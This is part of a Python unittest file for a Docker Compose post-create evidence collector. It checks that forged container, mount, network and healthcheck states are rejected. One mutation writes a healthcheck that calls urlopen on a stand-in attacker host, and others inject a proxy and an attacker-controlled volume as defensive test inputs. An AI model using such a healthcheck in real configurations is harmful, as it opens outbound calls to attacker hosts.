        value.images[edge_reference]["Config"]["Healthcheck"] = {
            "StartInterval": 2_000_000_000
        }
        value.containers["edge"]["Config"]["Healthcheck"][
            "StartInterval"
        ] = 2_000_000_000
        evidence, _runner = self._collect(value.outputs())
        document = json.loads(evidence.raw)
        edge_security = document["semantic_projection"]["containers"]["edge"][
            "security"
        ]
        self.assertEqual(
            edge_security["healthcheck"]["source"],
            "COMPOSE_WITH_IMAGE_DEFAULTS",
        )
        self.assertEqual(
            edge_security["healthcheck"]["field_sources"]["StartInterval"],
            "IMAGE_INHERITED",
        )
        self.assertNotIn("wget", evidence.raw.decode("ascii"))
        self.assertNotIn("pilot.example.org", evidence.raw.decode("ascii"))

    def test_environment_merge_source_has_all_four_closed_states(self) -> None:
        cases = (
            ({}, {}, {}, "EMPTY"),
            ({}, {"IMAGE_ONLY": "private"}, {"IMAGE_ONLY": "private"}, "IMAGE_INHERITED"),
            ({"COMPOSE_ONLY": "private"}, {}, {"COMPOSE_ONLY": "private"}, "COMPOSE_EXPLICIT"),
            (
                {"COMPOSE_ONLY": "private"},
                {"IMAGE_ONLY": "private"},
                {"COMPOSE_ONLY": "private", "IMAGE_ONLY": "private"},
                "COMPOSE_WITH_IMAGE_DEFAULTS",
            ),
            (
                {"SHARED": "compose-private"},
                {"SHARED": "image-private"},
                {"SHARED": "compose-private"},
                "COMPOSE_EXPLICIT",
            ),
        )
        for compose_environment, image_environment, effective, source in cases:
            with self.subTest(source=source):
                value, projection = collector._effective_environment(
                    compose_environment, image_environment
                )
                self.assertEqual(dict(value), effective)
                self.assertEqual(projection["source"], source)
                self.assertEqual(
                    preflight._environment_merge_source(
                        compose_entry_count=projection["compose_entry_count"],
                        image_entry_count=projection["image_entry_count"],
                        inherited_image_entry_count=projection[
                            "inherited_image_entry_count"
                        ],
                    ),
                    source,
                )
                self.assertTrue(projection["exact_map_match"])
                self.assertTrue(projection["proxy_keys_absent"])

    def test_resolved_compose_runtime_matrix_is_closed_and_command_allowlisted(self) -> None:
        _snapshot, _manifest, raw = preflight._release.load_real_oidc_release_snapshot(
            self.snapshot.attempt_root
        )
        original = json.loads(raw)
        mutations = []

        value = copy.deepcopy(original)
        value["services"]["api"]["healthcheck"]["test"][-1] = (
            "import urllib.request; urllib.request.urlopen('http://attacker.invalid/')"
        )
        mutations.append(value)
        value = copy.deepcopy(original)
        value["services"]["api"]["healthcheck"]["unexpected"] = "1s"
        mutations.append(value)
        value = copy.deepcopy(original)
        value["services"]["db"]["stop_grace_period"] = "60s"
        mutations.append(value)
        value = copy.deepcopy(original)
        value["services"]["web"]["stop_grace_period"] = "20s"
        mutations.append(value)
        value = copy.deepcopy(original)
        del value["services"]["api"]["stop_grace_period"]
        mutations.append(value)
        value = copy.deepcopy(original)
        value["services"]["edge"]["environment"]["HTTP_PROXY"] = (
            "http://private-proxy.example"
        )
        mutations.append(value)
        value = copy.deepcopy(original)
        value["services"]["edge"]["environment"]["INVALID-NAME"] = "private"
        mutations.append(value)
        value = copy.deepcopy(original)
        value["services"]["edge"]["environment"]["VALID_NAME"] = "private\x00value"
        mutations.append(value)

        for index, value in enumerate(mutations):
            with self.subTest(index=index), mock.patch.object(
                preflight._release,
                "load_real_oidc_release_snapshot",
                return_value=(self.snapshot, {}, _canonical(value)),
            ):
                with self.assertRaises(
                    preflight.PrivateServerRealOidcPreflightError
                ) as caught:
                    preflight._post_create_compose_contract(self.snapshot)
                self.assertEqual(
                    str(caught.exception),
                    "PRIVATE_SERVER_REAL_OIDC_PREFLIGHT_INVALID",
                )

        duplicate_environment_raw = raw.replace(
            b'"NODE_ENV":"production"',
            b'"NODE_ENV":"private","NODE_ENV":"production"',
            1,
        )
        self.assertNotEqual(duplicate_environment_raw, raw)
        with mock.patch.object(
            preflight._release,
            "load_real_oidc_release_snapshot",
            return_value=(self.snapshot, {}, duplicate_environment_raw),
        ):
            with self.assertRaises(preflight.PrivateServerRealOidcPreflightError):
                preflight._post_create_compose_contract(self.snapshot)

    def test_realistic_optional_inspect_fields_are_safely_projected(self) -> None:
        value = self.observation.clone()
        for service, item in value.containers.items():
            item["Config"]["Labels"]["com.docker.compose.config-hash"] = (
                hashlib.sha256(("config:" + service).encode()).hexdigest()
            )
            item["GraphDriver"] = {"Name": "overlay2", "Data": {"LowerDir": "/private"}}
            for endpoint in item["NetworkSettings"]["Networks"].values():
                endpoint["DNSNames"] = list(endpoint["Aliases"])
                endpoint["EndpointID"] = ""
                endpoint["IPAddress"] = ""
            item["Mounts"].reverse()
            if "Mounts" in item["HostConfig"]:
                item["HostConfig"]["Mounts"].reverse()
        self.assertEqual(
            value.containers["edge"]["NetworkSettings"]["Ports"], {}
        )
        for network in value.networks.values():
            network["IPAM"]["Config"][0]["Gateway"] = ""
            network["Options"] = {}
        value.volume["Options"] = None
        evidence, _runner = self._collect(value.outputs())
        self.assertEqual(
            evidence.collection_status,
            "COLLECTED_BASELINE_PROJECTION_VALIDATED_NOT_AUTHORITY",
        )

    def test_state_image_inventory_and_parser_mutations_fail_closed(self) -> None:
        cases = []
        changed = self.observation.clone()
        changed.containers["api"]["State"]["Status"] = "exited"
        cases.append(changed.outputs())
        changed = self.observation.clone()
        changed.containers["api"]["State"]["Running"] = 0
        cases.append(changed.outputs())
        changed = self.observation.clone()
        changed.containers["api"]["State"]["Pid"] = False
        cases.append(changed.outputs())
        changed = self.observation.clone()
        changed.containers["api"]["RestartCount"] = False
        cases.append(changed.outputs())
        changed = self.observation.clone()
        changed.containers["api"]["State"]["StartedAt"] = (
            "0001-01-01T00:00:00Z-forged"
        )
        cases.append(changed.outputs())
        changed = self.observation.clone()
        changed.containers["web"]["Image"] = next(iter(self.create_plan.raw.decode()), "x")
        cases.append(changed.outputs())
        changed = self.observation.clone()
        outputs = changed.outputs()
        outputs[-3] += _canonical({"Id": "f" * 64, "Name": PROJECT + "-extra-1"})
        cases.append(outputs)
        outputs = self.observation.outputs()
        extra = _canonical({"Id": "e" * 64, "Name": PROJECT + "-extra-1"})
        outputs[0] += extra
        outputs[-3] += extra
        cases.append(outputs)
        changed = self.observation.clone()
        changed.containers["api"]["Config"]["Labels"][
            "com.docker.compose.service"
        ] = "web"
        cases.append(changed.outputs())
        outputs = self.observation.outputs()
        outputs[3] = b'{"Id":"a","Id":"b"}\n'
        cases.append(outputs)
        outputs = self.observation.outputs()
        outputs[3] = b"\xff"
        cases.append(outputs)
        for index, outputs in enumerate(cases):
            with self.subTest(index=index):
                runner = _Runner(self.commands, outputs)
                with self.assertRaises(
                    collector.PrivateServerRealOidcPostCreateCollectorError
                ):
                    collector.collect_post_create_evidence(
                        attempt_root=self.fixture.attempt,
                        create_plan_raw=self.create_plan.raw,
                        command_runner=runner,
                    )

    def test_mount_network_port_guard_db_and_volume_mutations_fail_closed(self) -> None:
        mutations = []

        def expected_mount(value, source_kind):
            for service in preflight._SERVICES:
                for mount in value.contract["services"][service]["mounts"]:
                    if mount["source_kind"] == source_kind:
                        return service, mount
            raise AssertionError("fixture is missing reviewed mount kind")

        def top_mount(value, service, mount):
            return next(
                item
                for item in value.containers[service]["Mounts"]
                if item["Destination"] == mount["destination"]
            )

        def host_config_mount(value, service, mount):
            return next(
                item
                for item in value.containers[service]["HostConfig"]["Mounts"]
                if item["Target"] == mount["destination"]
            )

        value = self.observation.clone()
        value.containers["api"]["HostConfig"]["NetworkMode"] = "container:" + "f" * 64
        mutations.append(value)
        value = self.observation.clone()
        value.containers["api"]["NetworkSettings"]["Networks"] = {
            value.contract["networks"]["data"]["name"]: {
                "NetworkID": "", "Aliases": ["api"], "IPAMConfig": None
            }
        }
        mutations.append(value)
        value = self.observation.clone()
        guard_app = value.contract["networks"]["app"]["name"]
        value.containers["oidc-egress-guard"]["NetworkSettings"]["Networks"][guard_app]["Aliases"].remove("api")
        mutations.append(value)
        value = self.observation.clone()
        guard_app = value.contract["networks"]["app"]["name"]
        value.containers["oidc-egress-guard"]["NetworkSettings"]["Networks"][guard_app]["DNSNames"] = list(
            value.containers["oidc-egress-guard"]["NetworkSettings"]["Networks"][guard_app]["Aliases"]
        ) + ["attacker"]
        mutations.append(value)
        value = self.observation.clone()
        value.containers["db"]["NetworkSettings"]["Networks"][value.contract["networks"]["data"]["name"]]["IPAMConfig"]["IPv4Address"] = "172.29.25.11"
        mutations.append(value)
        value = self.observation.clone()
        guard_app = value.contract["networks"]["app"]["name"]
        value.containers["oidc-egress-guard"]["NetworkSettings"]["Networks"][
            guard_app
        ]["IPAMConfig"] = None
        mutations.append(value)
        value = self.observation.clone()
        app_name = value.contract["networks"]["app"]["name"]
        value.containers["web"]["NetworkSettings"]["Networks"][app_name][
            "IPAMConfig"
        ] = {"IPv4Address": "", "IPv6Address": ""}
        mutations.append(value)
        value = self.observation.clone()
        guard_data = value.contract["networks"]["data"]["name"]
        del value.containers["oidc-egress-guard"]["NetworkSettings"]["Networks"][
            guard_data
        ]["IPAMConfig"]["IPv6Address"]
        mutations.append(value)
        value = self.observation.clone()
        guard_egress = value.contract["networks"]["oidc-egress"]["name"]
        value.containers["oidc-egress-guard"]["NetworkSettings"]["Networks"][
            guard_egress
        ]["IPAMConfig"]["Gateway"] = "172.29.26.1"
        mutations.append(value)
        value = self.observation.clone()
        app_name = value.contract["networks"]["app"]["name"]
        del value.containers["web"]["NetworkSettings"]["Networks"][app_name][
            "IPAMConfig"
        ]
        mutations.append(value)
        value = self.observation.clone()
        value.containers["edge"]["HostConfig"]["PortBindings"]["443/tcp"][0]["HostIp"] = "0.0.0.0"
        mutations.append(value)
        value = self.observation.clone()
        value.containers["migrate"]["HostConfig"]["PortBindings"] = {"9999/tcp": []}
        mutations.append(value)

        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        top_mount(value, service, mount)["Mode"] = "ro"
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        top_mount(value, service, mount)["Propagation"] = ""
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        top_mount(value, service, mount)["Name"] = "forged-bind-name"
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        top_mount(value, service, mount)["Driver"] = "local"
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        top_mount(value, service, mount)["Unexpected"] = ""
        mutations.append(value)

        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        top_mount(value, service, mount)["RW"] = True
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        top_mount(value, service, mount)["Source"] = "/tmp/forged"
        mutations.append(value)

        value = self.observation.clone()
        service, mount = expected_mount(value, "volume")
        top_mount(value, service, mount)["Source"] = (
            "/var/lib/docker/volumes/forged/_data"
        )
        mutations.append(value)
        value = self.observation.clone()
        value.volume["Mountpoint"] = "/var/lib/docker/volumes/other/_data"
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "volume")
        top_mount(value, service, mount)["Driver"] = None
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "volume")
        top_mount(value, service, mount)["Mode"] = "ro"
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "volume")
        top_mount(value, service, mount)["Propagation"] = "rprivate"
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "volume")
        top_mount(value, service, mount)["Unexpected"] = ""
        mutations.append(value)

        value = self.observation.clone()
        value.containers["db"]["HostConfig"]["Binds"].append(
            "forged:/forged:rw"
        )
        mutations.append(value)
        value = self.observation.clone()
        value.containers["db"]["HostConfig"]["Binds"][0] = (
            value.contract["volume_name"]
            + ":/var/lib/postgresql/data:ro"
        )
        mutations.append(value)
        value = self.observation.clone()
        value.containers["edge"]["HostConfig"]["Binds"] = []
        mutations.append(value)
        value = self.observation.clone()
        del value.containers["edge"]["HostConfig"]["Binds"]
        mutations.append(value)

        value = self.observation.clone()
        service, mount = expected_mount(value, "config")
        host_config_mount(value, service, mount)["BindOptions"] = {}
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "secret")
        host_config_mount(value, service, mount)["BindOptions"] = {
            "Propagation": "rshared"
        }
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "bind")
        del host_config_mount(value, service, mount)["BindOptions"]
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "secret")
        host_config_mount(value, service, mount)["Consistency"] = ""
        mutations.append(value)
        value = self.observation.clone()
        service, _mount = expected_mount(value, "secret")
        value.containers[service]["HostConfig"]["Mounts"].append(
            {
                "Type": "bind",
                "Source": "/tmp/forged",
                "Target": "/run/forged",
                "ReadOnly": True,
                "BindOptions": {},
            }
        )
        mutations.append(value)
        value = self.observation.clone()
        service = next(
            service
            for service in preflight._SERVICES
            if not any(
                mount["type"] == "bind"
                for mount in value.contract["services"][service]["mounts"]
            )
        )
        value.containers[service]["HostConfig"]["Mounts"] = []
        mutations.append(value)
        value = self.observation.clone()
        service, mount = expected_mount(value, "secret")
        host_config_mount(value, service, mount)["Source"] = "/tmp/forged"
        mutations.append(value)

        value = self.observation.clone()
        app_name = value.contract["networks"]["app"]["name"]
        value.containers["web"]["NetworkSettings"]["Networks"][app_name][
            "NetworkID"
        ] = "d" * 64
        mutations.append(value)
        value = self.observation.clone()
        app_name = value.contract["networks"]["app"]["name"]
        del value.containers["web"]["NetworkSettings"]["Networks"][app_name][
            "NetworkID"
        ]
        mutations.append(value)
        value = self.observation.clone()
        app_name = value.contract["networks"]["app"]["name"]
        value.containers["web"]["NetworkSettings"]["Networks"][app_name][
            "NetworkID"
        ] = None
        mutations.append(value)
        value = self.observation.clone()
        value.networks["data"]["Containers"]["e" * 64] = {"Name": "foreign"}
        mutations.append(value)
        value = self.observation.clone()
        value.networks["app"]["Internal"] = False
        mutations.append(value)
        value = self.observation.clone()
        value.volume["Driver"] = "nfs"
        mutations.append(value)
        value = self.observation.clone()
        value.volume["Labels"]["com.docker.compose.volume"] = "other"
        mutations.append(value)
        value = self.observation.clone()
        value.volume["Options"] = {
            "type": "none",
            "o": "bind",
            "device": "/attacker-controlled",
        }
        mutations.append(value)
        value = self.observation.clone()
        value.containers["oidc-egress-guard"]["Config"]["Env"][0] = "DESIRE_REAL_OIDC_DB_DATA_IPV4=172.29.25.11"
        mutations.append(value)
        value = self.observation.clone()
        value.containers["api"]["HostConfig"]["ExtraHosts"] = ["db:172.29.25.11"]
        mutations.append(value)
        for index, value in enumerate(mutations):
            with self.subTest(index=index):
                with self.assertRaises(
                    collector.PrivateServerRealOidcPostCreateCollectorError
                ):
                    self._collect(value.outputs())

    def test_runner_failures_are_single_attempt_and_non_reflective(self) -> None:
        for mutation in ("stderr", "returncode", "oversize"):
            calls = []

            def runner(command, environment):
                calls.append(tuple(command))
                if mutation == "stderr":
                    return subprocess.CompletedProcess(command, 0, b"{}\n", b"secret-error")
                if mutation == "returncode":
                    return subprocess.CompletedProcess(command, 1, b"secret-output", b"")
                return subprocess.CompletedProcess(command, 0, b"x" * (collector._MAX_INVENTORY_STDOUT + 1), b"")

            with self.subTest(mutation=mutation):
                with self.assertRaises(
                    collector.PrivateServerRealOidcPostCreateCollectorError
                ) as caught:
                    collector.collect_post_create_evidence(
                        attempt_root=self.fixture.attempt,
                        create_plan_raw=self.create_plan.raw,
                        command_runner=runner,
                    )
                self.assertEqual(len(calls), 1)
                self.assertNotIn("secret", str(caught.exception))

    def test_default_runner_uses_closed_non_shell_process_contract(self) -> None:
        command = (
            "/usr/bin/docker",
            "--host",
            preflight._DOCKER_ENDPOINT,
            "version",
        )
        completed = subprocess.CompletedProcess(command, 0, b"{}\n", b"")
        with mock.patch.object(
            collector.subprocess, "run", return_value=completed
        ) as run:
            self.assertIs(
                collector._default_runner(command, collector._CLOSED_ENVIRONMENT),
                completed,
            )
        args, kwargs = run.call_args
        self.assertEqual(args, (command,))
        self.assertEqual(kwargs["cwd"], "/")
        self.assertEqual(kwargs["env"], dict(collector._CLOSED_ENVIRONMENT))
        self.assertIs(kwargs["stdin"], subprocess.DEVNULL)
        self.assertIs(kwargs["stdout"], subprocess.PIPE)
        self.assertIs(kwargs["stderr"], subprocess.PIPE)
        self.assertFalse(kwargs["check"])
        self.assertEqual(kwargs["timeout"], 30)
        self.assertNotIn("shell", kwargs)

    def test_cli_seals_private_output_and_execute_is_unreachable(self) -> None:
        create_path = self.fixture.parent / "create-plan.json"
        create_path.write_bytes(self.create_plan.raw)
        create_path.chmod(0o400)
        output_path = self.fixture.parent / "collection-plan.json"
        called = []
        stdout = io.StringIO()
        result = collector.main(
            [
                "--attempt-root", str(self.fixture.attempt),
                "--create-plan-file", str(create_path),
                "--output-file", str(output_path),
            ],
            stdout=stdout,
            command_runner=lambda *_args: called.append(True),
        )
        self.assertEqual(result, 0)
        self.assertEqual(called, [])
        self.assertEqual(stat.S_IMODE(output_path.stat().st_mode), 0o400)
        self.assertEqual(output_path.stat().st_nlink, 1)
        self.assertEqual(stdout.getvalue(), collector.PLAN_READY)
        stdout = io.StringIO()
        self.assertEqual(
            collector.main(
                [
                    "--action", "execute",
                    "--attempt-root", str(self.fixture.attempt),
                    "--create-plan-file", str(create_path),
                ],
                stdout=stdout,
                command_runner=lambda *_args: called.append(True),
            ),
            2,
        )
        self.assertEqual(called, [])
        self.assertEqual(stdout.getvalue(), collector.BLOCKED)
        stdout = io.StringIO()
        self.assertEqual(
            collector.main(
                [
                    "--action", "start",
                    "--attempt-root", str(self.fixture.attempt),
                    "--create-plan-file", str(create_path),
                ],
                stdout=stdout,
                command_runner=lambda *_args: called.append(True),
            ),
            2,
        )
        self.assertEqual(called, [])
        self.assertEqual(stdout.getvalue(), collector.BLOCKED)
        with self.assertRaises(collector.PrivateServerRealOidcPostCreateCollectorError):
            collector.write_collection_plan(output_path, collector.build_collection_plan(
                attempt_root=self.fixture.attempt, create_plan_raw=self.create_plan.raw
            ))

    def test_collect_cli_writes_v2_check_reopens_and_tamper_fails_closed(self) -> None:
        create_path = self.fixture.parent / "create-plan-for-collect.json"
        create_path.write_bytes(self.create_plan.raw)
        create_path.chmod(0o400)
        evidence_path = self.fixture.parent / "collected-evidence-v2.json"
        runner = _Runner(self.commands, self.observation.outputs())
        stdout = io.StringIO()
        self.assertEqual(
            collector.main(
                [
                    "--action", "collect",
                    "--attempt-root", str(self.fixture.attempt),
                    "--create-plan-file", str(create_path),
                    "--output-file", str(evidence_path),
                ],
                stdout=stdout,
                command_runner=runner,
            ),
            0,
        )
        self.assertEqual(stdout.getvalue(), collector.COLLECTED)
        self.assertEqual(stat.S_IMODE(evidence_path.stat().st_mode), 0o400)
        self.assertEqual(evidence_path.stat().st_nlink, 1)
        self.assertEqual(len(runner.calls), len(preflight._SERVICES) + 16)
        stdout = io.StringIO()
        self.assertEqual(
            collector.main(
                [
                    "--action", "check",
                    "--attempt-root", str(self.fixture.attempt),
                    "--create-plan-file", str(create_path),
                    "--evidence-file", str(evidence_path),
                ],
                stdout=stdout,
            ),
            0,
        )
        self.assertEqual(stdout.getvalue(), collector.CHECKED)

        tampered = json.loads(evidence_path.read_bytes())
        tampered["execute_blockers"].remove(
            "POST_CREATE_SECURITY_PROJECTION_RULE_VALIDATOR_UNIMPLEMENTED"
        )
        evidence_path.chmod(0o600)
        evidence_path.write_bytes(_canonical(tampered))
        evidence_path.chmod(0o400)
        stdout = io.StringIO()
        self.assertEqual(
            collector.main(
                [
                    "--action", "check",
                    "--attempt-root", str(self.fixture.attempt),
                    "--create-plan-file", str(create_path),
                    "--evidence-file", str(evidence_path),
                ],
                stdout=stdout,
            ),
            2,
        )
        self.assertEqual(stdout.getvalue(), collector.BLOCKED)

    def test_collected_output_rejects_symlink_hardlink_and_unsafe_parent(self) -> None:
        evidence, _runner = self._collect()
        target = self.fixture.parent / "collector-existing-target.json"
        target.write_bytes(b"target")
        target.chmod(0o400)
        symlink = self.fixture.parent / "collector-symlink.json"
        symlink.symlink_to(target)
        with self.assertRaises(collector.PrivateServerRealOidcPostCreateCollectorError):
            collector.write_collected_evidence(symlink, evidence)

        output = self.fixture.parent / "collector-hardlink-source.json"
        seal = collector.write_collected_evidence(output, evidence)
        self.assertEqual(seal.sha256, hashlib.sha256(evidence.raw).hexdigest())
        self.assertEqual((seal.device, seal.inode), (output.stat().st_dev, output.stat().st_ino))
        self.assertEqual(seal.size, len(evidence.raw))
        hardlink = self.fixture.parent / "collector-hardlink-copy.json"
        os.link(output, hardlink)
        with self.assertRaises(collector.PrivateServerRealOidcPostCreateCollectorError):
            collector.check_collected_evidence_file(
                attempt_root=self.fixture.attempt,
                create_plan_raw=self.create_plan.raw,
                evidence_file=output,
            )

        unsafe = self.fixture.parent / "unsafe-output-parent"
        unsafe.mkdir(mode=0o755)
        with self.assertRaises(collector.PrivateServerRealOidcPostCreateCollectorError):
            collector.write_collected_evidence(unsafe / "evidence.json", evidence)


if __name__ == "__main__":
    unittest.main()
